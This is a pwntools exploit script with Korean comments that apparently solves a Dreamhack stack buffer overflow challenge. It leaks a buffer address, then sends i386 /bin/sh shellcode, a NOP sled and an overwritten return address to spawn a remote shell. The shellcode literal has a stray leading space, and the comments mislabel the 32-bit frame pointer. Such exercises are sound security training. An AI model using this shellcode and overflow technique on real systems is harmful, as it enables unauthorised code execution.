'''
<스택>
buf 128바이트
rbp 4바이트
ret 4바이트

<전략>
payload = [26바이트 쉘코드] + [102바이트 \x90 으로 nop 을 채움] + [패딩더미 없음] + [4바이트 rbp 더미] + [4바이트 ret에 buf주소 뒤집어서]

'''

from pwn import *

context.arch = "i386"

p = remote('host3.dreamhack.games', 17390)

# bufaddr = int(p.recv()[7:17], 16)	

bufaddr = p.recvn(17) # 이때 받은 데이터는 바이트형임
bufaddr = bufaddr[7:] # 6번째 인덱스까지 잘라냄
bufaddr = int(bufaddr, 16) # 바이트형에서 16진수 int형으로 형 변환
bufaddr = p32(bufaddr)


shellcode = b' \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80' # 26 Bytes Shell Code

payload = shellcode
payload += b'\x90' * 102 # nop 수행
# payload += b'A' * 8 # 8바이트 패딩 더미 없음
payload += b'B' * 4 # 4바이트 rbp 더미
payload += bufaddr


p.sendline(payload)

p.interactive()
